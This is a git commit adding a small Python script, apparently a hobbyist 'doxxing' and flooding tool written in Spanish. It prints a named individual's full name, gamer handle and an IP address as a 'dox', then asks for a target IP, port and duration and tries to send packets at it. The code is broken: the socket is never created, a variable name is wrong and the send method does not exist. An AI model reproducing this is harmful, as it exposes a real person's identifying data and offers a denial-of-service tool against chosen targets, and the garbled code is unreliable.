69277fd54175c27377088720de926cfc9ccd01a9
TheKiller118 <82049734+TheKiller118@users.noreply.github.com>
2021-06-05 00:20:03 -0300

    Add files via upload

---
+++ DTR.py
@@ -0,0 +1,38 @@
+import os
+import random
+import socket
+import string
+import time
+import webbrowser
+import zipfile
+import colorama
+import requests
+from colorama import Fore, init
+
+#cr 
+green = Fore.GREEN
+red = Fore.RED
+blue = Fore.BLUE
+yellow = Fore.YELLOW 
+white = Fore.WHITE
+
+print(f"{yellow} -+-+-+-+-++-----:Creator: TH3H4D3$")
+print(f"{green} Python: 100% Powershell: 0%")
+print(f"{red} Modules: 10")
+
+print(f"{blue} pon cd doxes para ver los doxxeos")
+input(f"{yellow}#")
+
+print(f"{blue} Doxxeos:")
+print(f"{yellow} Rodriguez Cabaleiro GonzaloGamer50")
+print(f"{red} Informacion:")
+print(f"{green} ip: 92.177.18.60")
+print(f"{red} ip privada: 255.255.255.254")
+time.sleep(1)
+
+ip = input("IP >> ")
+port = int(input(f"{yellow} ingrese puerto"))
+dur = int(input(f"{blue} ingrese duracion"))
+
+timeout = time.time() + dur
+sock.sendTo("10", (ip, puerto))
